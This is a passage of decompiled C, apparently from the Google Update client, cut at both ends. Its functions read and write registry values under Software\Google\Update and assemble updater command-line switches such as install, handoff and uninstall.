  FUN_00406a0c(&local_14);
  return;
}



undefined4 * __fastcall FUN_00413046(undefined4 *param_1,byte param_2)

{
  undefined4 *puVar1;
  uint uVar2;
  undefined4 uVar3;
  int *piVar4;
  int **ppiVar5;
  wchar_t *pwVar6;
  wchar_t *pwVar7;
  undefined4 *local_8;
  
  local_8 = param_1;
  FUN_00411d09();
  if (((param_2 == 0) || (uVar2 = FUN_004142d7(), (char)uVar2 == '\0')) &&
     (uVar3 = FUN_00411ec0(param_2), (char)uVar3 != '\0')) {
    pwVar7 = L"HKLM\\Software\\Google\\Update\\";
    pwVar6 = L"HKLM\\Software\\Google\\Update\\";
    if (param_2 == 0) {
      pwVar6 = L"HKCU\\Software\\Google\\Update\\";
    }
    uVar2 = FUN_004071a3((HMODULE)pwVar6,L"uid");
    if ((char)uVar2 == '\0') {
      FUN_00412dfa(param_2);
    }
    else {
      FUN_00412b33();
    }
    piVar4 = (int *)FUN_0040139e();
    CSimpleStringT__(&local_8,piVar4);
    if (param_2 == 0) {
      pwVar7 = L"HKCU\\Software\\Google\\Update\\";
    }
    FUN_00408688((HMODULE)pwVar7,L"uid",&local_8);
    puVar1 = local_8;
    ppiVar5 = FUN_00401aca((int **)(local_8 + -4));
    *param_1 = ppiVar5 + 4;
    FUN_00401df0((int **)(puVar1 + -4));
    return param_1;
  }
  FUN_00412f94(param_2);
  piVar4 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1,piVar4);
  return param_1;
}



int * __fastcall FUN_004130f8(int *param_1,undefined4 param_2,int **param_3)

{
  code *pcVar1;
  undefined4 *puVar2;
  int **ppiVar3;
  int *piVar4;
  uint uVar5;
  int *piVar6;
  
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  uVar5 = (int)param_3[1] - (int)*param_3 >> 2;
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  if (uVar5 != 0) {
    if (0x3fffffff < uVar5) {
      FUN_00422ea9(0,(short)param_2);
      pcVar1 = (code *)swi(3);
      piVar4 = (int *)(*pcVar1)();
      return piVar4;
    }
    puVar2 = (undefined4 *)FUN_00402ed5(0,param_2,uVar5);
    *param_1 = (int)puVar2;
    param_1[1] = (int)puVar2;
    param_1[2] = (int)(puVar2 + uVar5);
    piVar4 = param_3[1];
    for (piVar6 = *param_3; piVar6 != piVar4; piVar6 = piVar6 + 1) {
      if (puVar2 != (undefined4 *)0x0) {
        ppiVar3 = FUN_00401aca((int **)(*piVar6 + -0x10));
        *puVar2 = ppiVar3 + 4;
      }
      puVar2 = puVar2 + 1;
    }
    param_1[1] = (int)puVar2;
  }
  return param_1;
}



undefined4 * __thiscall FUN_00413180(void *this,byte param_1)

{
  FUN_00413221((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall
FUN_0041319f(void *this,undefined4 param_1,undefined4 param_2,undefined param_3)

{
  int *piVar1;
  
  *(undefined **)((int)this + 4) = &DAT_00437b94;
  *(undefined ***)this = &PTR_FUN_00431924;
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__((void *)((int)this + 8),piVar1);
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__((CSimpleStringT_char_0_ *)((int)this + 0xc),piVar1);
  *(undefined4 *)((int)this + 0x10) = 0;
  *(undefined4 *)((int)this + 0x14) = 0;
  *(undefined4 *)((int)this + 0x18) = 0;
  *(undefined4 *)((int)this + 0x1c) = 0;
  *(undefined4 *)((int)this + 0x20) = 0;
  *(undefined4 *)((int)this + 0x24) = 0;
  *(undefined4 *)((int)this + 0x28) = 0;
  *(undefined4 *)((int)this + 0x2c) = 0;
  *(undefined4 *)((int)this + 0x30) = 0;
  *(undefined4 *)((int)this + 0x34) = 0;
  *(undefined4 *)((int)this + 0x38) = 0;
  *(undefined4 *)((int)this + 0x3c) = 0;
  *(undefined4 *)((int)this + 0x40) = 0;
  *(undefined4 *)((int)this + 0x44) = 0;
  *(undefined4 *)((int)this + 0x48) = 0;
  *(undefined *)((int)this + 0x4c) = param_3;
  FUN_00402fa2((CSimpleStringT_char_0_ *)((int)this + 0xc),
               L"Software\\Google\\%ws\\UsageStats\\Daily");
  return (undefined4 *)this;
}



void __fastcall FUN_00413221(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_00431924;
  FUN_00411163((HKEY *)(param_1 + 0x10));
  FUN_00411163((HKEY *)(param_1 + 0xd));
  FUN_00411163((HKEY *)(param_1 + 10));
  FUN_00411163((HKEY *)(param_1 + 7));
  FUN_00411163((HKEY *)(param_1 + 4));
  FUN_00401df0((int **)(param_1[3] + -0x10));
  FUN_00401df0((int **)(param_1[2] + -0x10));
  *param_1 = &PTR_FUN_00431940;
  return;
}



void __fastcall FUN_00413293(int param_1)

{
  FUN_00411163((HKEY *)(param_1 + 0x1c));
  FUN_00411163((HKEY *)(param_1 + 0x28));
  FUN_00411163((HKEY *)(param_1 + 0x34));
  FUN_00411163((HKEY *)(param_1 + 0x40));
  FUN_00411163((HKEY *)(param_1 + 0x10));
  return;
}



char __thiscall FUN_004132bf(void *this,LPCWSTR param_1,int *param_2)

{
  char cVar1;
  int iVar2;
  
  if (*param_2 == 0) {
    iVar2 = FUN_004136d4(param_2,*(HKEY *)((int)this + 0x10),param_1);
    cVar1 = '\x01' - (iVar2 != 0);
  }
  else {
    cVar1 = '\x01';
  }
  return cVar1;
}



void __thiscall FUN_004132e8(void *this,int param_1)

{
  HKEY *ppHVar1;
  uint uVar2;
  int iVar3;
  char cVar4;
  bool bVar5;
  uint local_14;
  int local_10;
  int local_c;
  LPCWSTR local_8;
  
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_00437f38);
  uVar2 = *(uint *)(param_1 + 0x18);
  iVar3 = *(int *)(param_1 + 0x1c);
  *(undefined4 *)(param_1 + 0x18) = 0;
  *(undefined4 *)(param_1 + 0x1c) = 0;
  local_c = iVar3;
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_00437f38);
  if ((uVar2 != 0) || (iVar3 != 0)) {
    ppHVar1 = (HKEY *)((int)this + 0x1c);
    cVar4 = FUN_004132bf(this,L"Counts",(int *)ppHVar1);
    if (cVar4 != '\0') {
      FUN_00407adc(&local_8,*(HMODULE *)(param_1 + 4));
      local_14 = 0;
      local_10 = 0;
      FUN_004135c5(ppHVar1,local_8,&local_14);
      bVar5 = CARRY4(local_14,uVar2);
      local_14 = local_14 + uVar2;
      local_10 = local_10 + local_c + (uint)bVar5;
      RegSetValueExW(*ppHVar1,local_8,0,3,(BYTE *)&local_14,8);
      FUN_00401df0((int **)(local_8 + -8));
    }
  }
  return;
}



undefined8 __thiscall FUN_00413391(void *this,LPCWSTR param_1)

{
  HKEY *ppHVar1;
  LPCWSTR lpValueName;
  char cVar2;
  undefined4 uVar3;
  int iVar4;
  uint *puVar5;
  uint *puVar6;
  bool bVar7;
  undefined8 uVar8;
  LPCWSTR local_54;
  uint local_50 [2];
  uint local_48;
  int local_44;
  uint local_40;
  uint local_3c;
  uint local_38;
  uint local_34;
  uint local_30 [4];
  uint local_20;
  int local_1c;
  uint local_18;
  int local_14;
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)&local_54;
  local_54 = param_1;
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_00437f38);
  puVar5 = (uint *)(param_1 + 0xc);
  puVar6 = local_30;
  for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar6 = *puVar5;
    puVar5 = puVar5 + 1;
    puVar6 = puVar6 + 1;
  }
  FUN_00416e80((uint *)(param_1 + 0xc),0,0x20);
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_00437f38);
  if (local_30[0] != 0) {
    ppHVar1 = (HKEY *)((int)this + 0x28);
    cVar2 = FUN_004132bf(this,L"Timings",(int *)ppHVar1);
    if (cVar2 != '\0') {
      FUN_00407adc(&local_54,*(HMODULE *)(local_54 + 2));
      lpValueName = local_54;
      uVar3 = FUN_00413613(ppHVar1,local_54,local_50);
      if ((char)uVar3 == '\0') {
        FID_conflict__memcpy(local_50,local_30,0x20);
      }
      else {
        local_50[0] = local_50[0] + local_30[0];
        bVar7 = CARRY4(local_48,local_30[2]);
        local_48 = local_48 + local_30[2];
        local_44 = local_44 + local_30[3] + (uint)bVar7;
        if (((int)local_3c < local_1c) || (((int)local_3c <= local_1c && (local_40 <= local_20)))) {
          puVar5 = &local_40;
        }
        else {
          puVar5 = &local_20;
        }
        local_40 = *puVar5;
        local_3c = puVar5[1];
        if ((local_14 < (int)local_34) || ((local_14 <= (int)local_34 && (local_18 <= local_38)))) {
          puVar5 = &local_38;
        }
        else {
          puVar5 = &local_18;
        }
        local_38 = *puVar5;
        local_34 = puVar5[1];
      }
      RegSetValueExW(*ppHVar1,lpValueName,0,3,(BYTE *)local_50,0x20);
      FUN_00401df0((int **)(lpValueName + -8));
    }
  }
  uVar8 = FUN_0041a954();
  return uVar8;
}



// WARNING: Could not reconcile some variable overlaps

void __thiscall FUN_004134e4(void *this,int param_1)

{
  int iVar1;
  char cVar2;
  LPCWSTR *ppWVar3;
  undefined8 local_c;
  
  iVar1 = param_1;
  local_c._0_4_ = this;
  local_c._4_4_ = this;
  local_c = FUN_0040e97d(param_1);
  if (local_c != 0) {
    cVar2 = FUN_004132bf(this,L"Integers",(int *)(HKEY *)((int)this + 0x34));
    if (cVar2 != '\0') {
      ppWVar3 = (LPCWSTR *)FUN_00407adc(&param_1,*(HMODULE *)(iVar1 + 4));
      RegSetValueExW(*(HKEY *)((int)this + 0x34),*ppWVar3,0,3,(BYTE *)&local_c,8);
      FUN_00401df0((int **)(param_1 + -0x10));
    }
  }
  return;
}



void __thiscall FUN_0041354d(void *this,int param_1)

{
  void *pvVar1;
  int iVar2;
  char cVar3;
  LPCWSTR *ppWVar4;
  void *local_8;
  
  local_8 = this;
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_00437f38);
  iVar2 = param_1;
  pvVar1 = *(void **)(param_1 + 0x14);
  *(undefined4 *)(param_1 + 0x14) = 0xffffffff;
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_00437f38);
  if (pvVar1 != (void *)0xffffffff) {
    local_8 = pvVar1;
    cVar3 = FUN_004132bf(this,L"Booleans",(int *)(HKEY *)((int)this + 0x40));
    if (cVar3 != '\0') {
      ppWVar4 = (LPCWSTR *)FUN_00407adc(&param_1,*(HMODULE *)(iVar2 + 4));
      RegSetValueExW(*(HKEY *)((int)this + 0x40),*ppWVar4,0,3,(BYTE *)&local_8,4);
      FUN_00401df0((int **)(param_1 + -0x10));
    }
  }
  return;
}



uint __fastcall FUN_004135c5(HKEY *param_1,LPCWSTR param_2,uint *param_3)

{
  LSTATUS LVar1;
  uint uVar2;
  uint *puVar3;
  HKEY *local_c;
  DWORD local_8;
  
  local_8 = 8;
  local_c = param_1;
  LVar1 = RegQueryValueExW(*param_1,param_2,(LPDWORD)0x0,(LPDWORD)&local_c,(LPBYTE)param_3,&local_8)
  ;
  if (((LVar1 == 0) && (local_c == (HKEY *)0x3)) && (local_8 == 8)) {
    uVar2 = 1;
  }
  else {
    puVar3 = FUN_00416e80(param_3,0,8);
    uVar2 = (uint)puVar3 & 0xffffff00;
  }
  return uVar2;
}



uint __fastcall FUN_00413613(HKEY *param_1,LPCWSTR param_2,uint *param_3)

{
  LSTATUS LVar1;
  uint uVar2;
  uint *puVar3;
  HKEY *local_c;
  DWORD local_8;
  
  local_8 = 0x20;
  local_c = param_1;
  LVar1 = RegQueryValueExW(*param_1,param_2,(LPDWORD)0x0,(LPDWORD)&local_c,(LPBYTE)param_3,&local_8)
  ;
  if (((LVar1 == 0) && (local_c == (HKEY *)0x3)) && (local_8 == 0x20)) {
    uVar2 = 1;
  }
  else {
    puVar3 = FUN_00416e80(param_3,0,0x20);
    uVar2 = (uint)puVar3 & 0xffffff00;
  }
  return uVar2;
}



LSTATUS __thiscall FUN_00413661(void *this,HKEY param_1,LPCWSTR param_2)

{
  HMODULE hModule;
  FARPROC pFVar1;
  int iVar2;
  LSTATUS LVar3;
  PHKEY in_stack_00000020;
  LPDWORD in_stack_00000024;
  
                    // WARNING: Load size is inaccurate
  if (*this == 0) {
    if (*(int *)((int)this + 4) != 0) {
      LVar3 = RegCreateKeyExW(param_1,param_2,0,(LPWSTR)0x0,0,0x2001f,(LPSECURITY_ATTRIBUTES)0x0,
                              in_stack_00000020,in_stack_00000024);
      return LVar3;
    }
  }
  else {
    hModule = GetModuleHandleW(L"Advapi32.dll");
    if ((hModule != (HMODULE)0x0) &&
       (pFVar1 = GetProcAddress(hModule,"RegCreateKeyTransactedW"), pFVar1 != (FARPROC)0x0)) {
                    // WARNING: Load size is inaccurate
      iVar2 = (*pFVar1)(param_1,param_2,0,0,0,0x2001f,0,in_stack_00000020,in_stack_00000024,*this,0)
      ;
      return iVar2;
    }
  }
  return 1;
}



int __thiscall FUN_004136d4(void *this,HKEY param_1,LPCWSTR param_2)

{
  int iVar1;
  void *local_c;
  HKEY local_8;
  
  local_8 = (HKEY)0x0;
  local_c = this;
  if (*(void **)((int)this + 8) == (void *)0x0) {
    iVar1 = RegCreateKeyExW(param_1,param_2,0,(LPWSTR)0x0,0,0x2001f,(LPSECURITY_ATTRIBUTES)0x0,
                            &local_8,(LPDWORD)&local_c);
  }
  else {
    iVar1 = FUN_00413661(*(void **)((int)this + 8),param_1,param_2);
  }
  if (iVar1 == 0) {
    iVar1 = FUN_00411163((HKEY *)this);
    *(HKEY *)this = local_8;
  }
  return iVar1;
}



undefined4 * __thiscall FUN_00413732(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_00431940;
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



undefined4 * __fastcall FUN_00413752(undefined4 *param_1)

{
  int *piVar1;
  
  *param_1 = 8;
  param_1[1] = 0;
  *(undefined *)(param_1 + 2) = 0;
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 3,piVar1);
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 4,piVar1);
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 5,piVar1);
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 6,piVar1);
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 7,piVar1);
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 8,piVar1);
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 9,piVar1);
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 10,piVar1);
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 0xb,piVar1);
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 0xc,piVar1);
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 0xd,piVar1);
  return param_1;
}



void __fastcall FUN_00413803(int param_1)

{
  FUN_00401df0((int **)(*(int *)(param_1 + 0x34) + -0x10));
  FUN_00401df0((int **)(*(int *)(param_1 + 0x30) + -0x10));
  FUN_00401df0((int **)(*(int *)(param_1 + 0x2c) + -0x10));
  FUN_00401df0((int **)(*(int *)(param_1 + 0x28) + -0x10));
  FUN_00401df0((int **)(*(int *)(param_1 + 0x24) + -0x10));
  FUN_00401df0((int **)(*(int *)(param_1 + 0x20) + -0x10));
  FUN_00401df0((int **)(*(int *)(param_1 + 0x1c) + -0x10));
  FUN_00401df0((int **)(*(int *)(param_1 + 0x18) + -0x10));
  FUN_00401df0((int **)(*(int *)(param_1 + 0x14) + -0x10));
  FUN_00401df0((int **)(*(int *)(param_1 + 0x10) + -0x10));
  FUN_00401df0((int **)(*(int *)(param_1 + 0xc) + -0x10));
  return;
}



int * __thiscall FUN_0041387a(void *this,int *param_1)

{
  int *this_00;
  int *piVar1;
  wchar_t *pwVar2;
  int *local_28;
  int *local_24;
  int *local_20;
  int *local_1c;
  int *local_18;
  int *local_14;
  int *local_10;
  int *local_c;
  int *local_8;
  
  piVar1 = (int *)FUN_0040139e();
  this_00 = param_1;
  CSimpleStringT__(param_1,piVar1);
                    // WARNING: Load size is inaccurate
  switch(*this) {
  case 1:
    FUN_00401ba1(this_00);
    return this_00;
  case 2:
    pwVar2 = (wchar_t *)&DAT_00431974;
    break;
  case 3:
    pwVar2 = (wchar_t *)&DAT_004319e8;
    break;
  case 4:
    pwVar2 = L"regserver";
    break;
  case 5:
    pwVar2 = L"unregserver";
    break;
  case 6:
    pwVar2 = L"netdiags";
    break;
  case 7:
    FUN_00404cfa(&param_1,(HMODULE)L"crash");
    FUN_00413b6a((CSimpleStringT_char_0_ *)&local_c);
    FUN_00401df0((int **)(param_1 + -4));
    FUN_00401b2a(this_00,(int *)&local_c);
    local_8 = local_c;
    goto LAB_00413ade;
  case 8:
    piVar1 = FUN_00413b97(this,&local_10);
    FUN_00401b2a(this_00,piVar1);
    local_8 = local_10;
    goto LAB_00413ade;
  case 9:
    piVar1 = FUN_00413d8e(this,&local_14);
    FUN_00401b2a(this_00,piVar1);
    local_8 = local_14;
    goto LAB_00413ade;
  case 10:
    piVar1 = (int *)FUN_00413e65(this,(CSimpleStringT_char_0_ *)&local_18);
    FUN_00401b2a(this_00,piVar1);
    local_8 = local_18;
    goto LAB_00413ade;
  default:
    goto switchD_004138a0_caseD_b;
  case 0xc:
    piVar1 = FUN_00413eb5(this,&local_1c);
    FUN_00401b2a(this_00,piVar1);
    local_8 = local_1c;
    goto LAB_00413ade;
  case 0xe:
    piVar1 = FUN_00413fc1(this,&local_20);
    FUN_00401b2a(this_00,piVar1);
    local_8 = local_20;
    goto LAB_00413ade;
  case 0xf:
    piVar1 = FUN_00414065(this,&local_24);
    FUN_00401b2a(this_00,piVar1);
    local_8 = local_24;
    goto LAB_00413ade;
  case 0x10:
    piVar1 = FUN_004140d5(this,&local_28);
    FUN_00401b2a(this_00,piVar1);
    local_8 = local_28;
    goto LAB_00413ade;
  case 0x11:
    pwVar2 = (wchar_t *)&DAT_0043199c;
    break;
  case 0x12:
    pwVar2 = L"-Embedding";
    goto LAB_00413a08;
  case 0x15:
    pwVar2 = L"registerproduct";
    goto LAB_00413a28;
  case 0x16:
    pwVar2 = L"unregisterproduct";
LAB_00413a28:
    FUN_00413cb7(this,&param_1,(int **)pwVar2);
    goto LAB_00413a10;
  case 0x17:
    pwVar2 = L"regsvc";
    break;
  case 0x18:
    pwVar2 = L"unregsvc";
    break;
  case 0x19:
    pwVar2 = L"crashhandler";
    break;
  case 0x1a:
    pwVar2 = L"/broker";
    goto LAB_00413a08;
  case 0x1b:
    pwVar2 = L"/ondemand";
LAB_00413a08:
    FUN_00404cfa(&param_1,(HMODULE)pwVar2);
LAB_00413a10:
    FUN_00401b2a(this_00,(int *)&param_1);
    local_8 = param_1;
    goto LAB_00413ade;
  case 0x1c:
    pwVar2 = L"medsvc";
    break;
  case 0x1d:
    pwVar2 = L"uninstall";
    break;
  case 0x1e:
    piVar1 = (int *)FUN_0040139e();
    CSimpleStringT__(&param_1,piVar1);
    FUN_00408121((int *)&param_1,0x1be8);
    goto LAB_00413a10;
  case 0x1f:
    FUN_00404cfa(&param_1,(HMODULE)L"healthcheck");
    FUN_00413b6a((CSimpleStringT_char_0_ *)&local_8);
    FUN_00401df0((int **)(param_1 + -4));
    FUN_00401b2a(this_00,(int *)&local_8);
    goto LAB_00413ade;
  }
  FUN_00404cfa(&param_1,(HMODULE)pwVar2);
  FUN_00413b6a((CSimpleStringT_char_0_ *)&local_8);
  FUN_00401df0((int **)(param_1 + -4));
  FUN_00401b2a(this_00,(int *)&local_8);
LAB_00413ade:
  FUN_00401df0((int **)(local_8 + -4));
switchD_004138a0_caseD_b:
  return this_00;
}



CSimpleStringT_char_0_ * FUN_00413b6a(CSimpleStringT_char_0_ *param_1)

{
  int *piVar1;
  
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1,piVar1);
  FUN_00402fa2(param_1,L"/%s");
  return param_1;
}



undefined4 * __thiscall FUN_00413b97(void *this,undefined4 *param_1)

{
  int **ppiVar1;
  void *pvVar2;
  int *piVar3;
  int **ppiVar4;
  int **local_c;
  void *local_8;
  
  local_c = (int **)this;
  local_8 = this;
  if (*(int *)(*(int *)((int)this + 0x18) + -0xc) == 0) {
    piVar3 = (int *)FUN_0040139e();
    CSimpleStringT__(param_1,piVar3);
  }
  else {
    FUN_00404cfa(&local_c,(HMODULE)L"report");
    FUN_00413b6a((CSimpleStringT_char_0_ *)&local_8);
    FUN_00401df0(local_c + -4);
    if (*(char *)((int)this + 4) != '\0') {
      FUN_0040814b(&local_8,0x1bc4);
    }
    local_c = FUN_00401aca((int **)(*(int *)((int)this + 0x18) + -0x10));
    local_c = local_c + 4;
    FUN_004087b2((int *)&local_c);
    ppiVar1 = local_c;
    FUN_0040814b(&local_8,0x1bd0);
    if (*(char *)((int)this + 5) != '\0') {
      FUN_0040814b(&local_8,0x1bc4);
    }
    if (*(int *)(*(int *)((int)this + 0x1c) + -0xc) != 0) {
      local_c = FUN_00401aca((int **)(*(int *)((int)this + 0x1c) + -0x10));
      local_c = local_c + 4;
      FUN_004087b2((int *)&local_c);
      ppiVar4 = local_c;
      FUN_0040814b(&local_8,0x1bd8);
      FUN_00401df0(ppiVar4 + -4);
    }
    pvVar2 = local_8;
    ppiVar4 = FUN_00401aca((int **)((int)local_8 + -0x10));
    *param_1 = ppiVar4 + 4;
    FUN_00401df0(ppiVar1 + -4);
    FUN_00401df0((int **)((int)pvVar2 + -0x10));
  }
  return param_1;
}



undefined4 * __thiscall FUN_00413cb7(void *this,undefined4 *param_1,int **param_2)

{
  int **ppiVar1;
  void *pvVar2;
  int *piVar3;
  int **ppiVar4;
  int **local_c;
  void *local_8;
  
  local_c = (int **)this;
  local_8 = this;
  if (*(int *)(*(int *)((int)this + 0xc) + -0xc) == 0) {
    piVar3 = (int *)FUN_0040139e();
    CSimpleStringT__(param_1,piVar3);
  }
  else {
    piVar3 = (int *)FUN_0040139e();
    CSimpleStringT__(&local_8,piVar3);
    local_c = FUN_00401aca((int **)(*(int *)((int)this + 0xc) + -0x10));
    local_c = local_c + 4;
    FUN_004087b2((int *)&local_c);
    ppiVar1 = local_c;
    FUN_00408121((int *)&local_8,0x1be8);
    if (*(int *)(*(int *)((int)this + 0x10) + -0xc) != 0) {
      ppiVar4 = FUN_00401aca((int **)(*(int *)((int)this + 0x10) + -0x10));
      param_2 = ppiVar4 + 4;
      FUN_004087b2((int *)&param_2);
      ppiVar4 = param_2;
      FUN_0040814b(&local_8,0x1bd8);
      FUN_00401df0(ppiVar4 + -4);
    }
    pvVar2 = local_8;
    ppiVar4 = FUN_00401aca((int **)((int)local_8 + -0x10));
    *param_1 = ppiVar4 + 4;
    FUN_00401df0(ppiVar1 + -4);
    FUN_00401df0((int **)((int)pvVar2 + -0x10));
  }
  return param_1;
}



undefined4 * __thiscall FUN_00413d8e(void *this,undefined4 *param_1)

{
  void *pvVar1;
  int *piVar2;
  int **ppiVar3;
  void *local_8;
  
  local_8 = this;
  FUN_00413cb7(this,&local_8,(int **)L"install");
  pvVar1 = local_8;
  if (*(int *)((int)local_8 + -0xc) == 0) {
    piVar2 = (int *)FUN_0040139e();
    CSimpleStringT__(param_1,piVar2);
    FUN_00401df0((int **)((int)pvVar1 + -0x10));
  }
  else {
    if (*(int *)(*(int *)((int)this + 0x14) + -0xc) != 0) {
      FUN_0040814b(&local_8,0x1bd8);
    }
    if (*(int *)(*(int *)((int)this + 0x34) + -0xc) != 0) {
      FUN_0040814b(&local_8,0x1bf8);
    }
    if (*(char *)((int)this + 6) != '\0') {
      FUN_0040814b(&local_8,0x1bc4);
    }
    if (*(char *)((int)this + 8) != '\0') {
      FUN_0040814b(&local_8,0x1bc4);
    }
    pvVar1 = local_8;
    ppiVar3 = FUN_00401aca((int **)((int)local_8 + -0x10));
    *param_1 = ppiVar3 + 4;
    FUN_00401df0((int **)((int)pvVar1 + -0x10));
  }
  return param_1;
}



CSimpleStringT_char_0_ * __thiscall FUN_00413e65(void *this,CSimpleStringT_char_0_ *param_1)

{
  int *piVar1;
  
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1,piVar1);
  FUN_00402fa2(param_1,L"/%s");
  if (*(int *)(*(int *)((int)this + 0x34) + -0xc) != 0) {
    FUN_0040814b(param_1,0x1bf8);
  }
  return param_1;
}



undefined4 * __thiscall FUN_00413eb5(void *this,undefined4 *param_1)

{
  void *pvVar1;
  int *piVar2;
  int **ppiVar3;
  void *local_8;
  
  local_8 = this;
  FUN_00413cb7(this,&local_8,(int **)L"handoff");
  pvVar1 = local_8;
  if (*(int *)((int)local_8 + -0xc) == 0) {
    piVar2 = (int *)FUN_0040139e();
    CSimpleStringT__(param_1,piVar2);
    FUN_00401df0((int **)((int)pvVar1 + -0x10));
  }
  else {
    if (*(int *)(*(int *)((int)this + 0x14) + -0xc) != 0) {
      FUN_0040814b(&local_8,0x1bd8);
    }
    if (*(int *)(*(int *)((int)this + 0x34) + -0xc) != 0) {
      FUN_0040814b(&local_8,0x1bf8);
    }
    if (*(char *)((int)this + 6) != '\0') {
      FUN_0040814b(&local_8,0x1bc4);
    }
    if (*(char *)((int)this + 7) != '\0') {
      FUN_0040814b(&local_8,0x1bc4);
    }
    if (*(char *)((int)this + 8) != '\0') {
      FUN_0040814b(&local_8,0x1bc4);
    }
    if (*(int *)(*(int *)((int)this + 0x30) + -0xc) != 0) {
      FUN_0040814b(&local_8,0x1bf8);
    }
    pvVar1 = local_8;
    ppiVar3 = FUN_00401aca((int **)((int)local_8 + -0x10));
    *param_1 = ppiVar3 + 4;
    FUN_00401df0((int **)((int)pvVar1 + -0x10));
  }
  return param_1;
}



undefined4 * __thiscall FUN_00413fc1(void *this,undefined4 *param_1)

{
  void *pvVar1;
  int *piVar2;
  int **ppiVar3;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  if (*(int *)(*(int *)((int)this + 0x14) + -0xc) == 0) {
    piVar2 = (int *)FUN_0040139e();
    CSimpleStringT__(param_1,piVar2);
  }
  else {
    FUN_00404cfa(&local_c,(HMODULE)&DAT_00431994);
    FUN_00413b6a((CSimpleStringT_char_0_ *)&local_8);
    FUN_00401df0((int **)((int)local_c + -0x10));
    if (*(char *)((int)this + 5) != '\0') {
      FUN_0040814b(&local_8,0x1bc4);
    }
    FUN_0040814b(&local_8,0x1bd8);
    pvVar1 = local_8;
    ppiVar3 = FUN_00401aca((int **)((int)local_8 + -0x10));
    *param_1 = ppiVar3 + 4;
    FUN_00401df0((int **)((int)pvVar1 + -0x10));
  }
  return param_1;
}



undefined4 * __thiscall FUN_00414065(void *this,undefined4 *param_1)

{
  void *pvVar1;
  int *piVar2;
  int **ppiVar3;
  void *local_8;
  
  local_8 = this;
  if (*(int *)(*(int *)((int)this + 0x28) + -0xc) == 0) {
    piVar2 = (int *)FUN_0040139e();
    CSimpleStringT__(param_1,piVar2);
  }
  else {
    piVar2 = (int *)FUN_0040139e();
    CSimpleStringT__(&local_8,piVar2);
    FUN_00408121((int *)&local_8,0x1be8);
    pvVar1 = local_8;
    ppiVar3 = FUN_00401aca((int **)((int)local_8 + -0x10));
    *param_1 = ppiVar3 + 4;
    FUN_00401df0((int **)((int)pvVar1 + -0x10));
  }
  return param_1;
}



undefined4 * __thiscall FUN_004140d5(void *this,undefined4 *param_1)

{
  int **ppiVar1;
  int **ppiVar2;
  int *piVar3;
  int **ppiVar4;
  int **local_10;
  int **local_c;
  int **local_8;
  
  if (((*(int *)(*(int *)((int)this + 0x20) + -0xc) == 0) ||
      (*(int *)(*(int *)((int)this + 0x24) + -0xc) == 0)) ||
     (*(int *)(*(int *)((int)this + 0x14) + -0xc) == 0)) {
    piVar3 = (int *)FUN_0040139e();
    CSimpleStringT__(param_1,piVar3);
  }
  else {
    piVar3 = (int *)FUN_0040139e();
    CSimpleStringT__(&local_10,piVar3);
    local_c = FUN_00401aca((int **)(*(int *)((int)this + 0x20) + -0x10));
    local_c = local_c + 4;
    local_8 = FUN_00401aca((int **)(*(int *)((int)this + 0x24) + -0x10));
    local_8 = local_8 + 4;
    FUN_004087b2((int *)&local_c);
    FUN_004087b2((int *)&local_8);
    ppiVar2 = local_8;
    ppiVar1 = local_c;
    FUN_00408121((int *)&local_10,0x1c0c);
    local_10 = local_10 + -4;
    ppiVar4 = FUN_00401aca(local_10);
    *param_1 = ppiVar4 + 4;
    FUN_00401df0(ppiVar2 + -4);
    FUN_00401df0(ppiVar1 + -4);
    FUN_00401df0(local_10);
  }
  return param_1;
}



int * __fastcall FUN_004141b8(int *param_1,char param_2,int **param_3)

{
  wchar_t *pwVar1;
  int *local_8;
  
  local_8 = param_1;
  FUN_00411d09();
  pwVar1 = L"HKLM\\Software\\Google\\Update\\ClientState\\";
  if (param_2 == '\0') {
    pwVar1 = L"HKCU\\Software\\Google\\Update\\ClientState\\";
  }
  FUN_00404cfa(&local_8,(HMODULE)pwVar1);
  FUN_004025b5(param_1,(int *)&local_8,param_3);
  FUN_00401df0((int **)(local_8 + -4));
  return param_1;
}



int * __thiscall FUN_004141ff(void *this,int **param_1)

{
  void *local_8;
  
  local_8 = this;
  FUN_00411d09();
  FUN_00404cfa(&local_8,(HMODULE)L"HKLM\\Software\\Google\\Update\\ClientStateMedium\\");
  FUN_004025b5((int *)this,(int *)&local_8,param_1);
  FUN_00401df0((int **)((int)local_8 + -0x10));
  return (int *)this;
}



uint __fastcall FUN_00414238(char param_1,int **param_2)

{
  HMODULE *ppHVar1;
  uint uVar2;
  uint uVar3;
  int local_10;
  int *local_c;
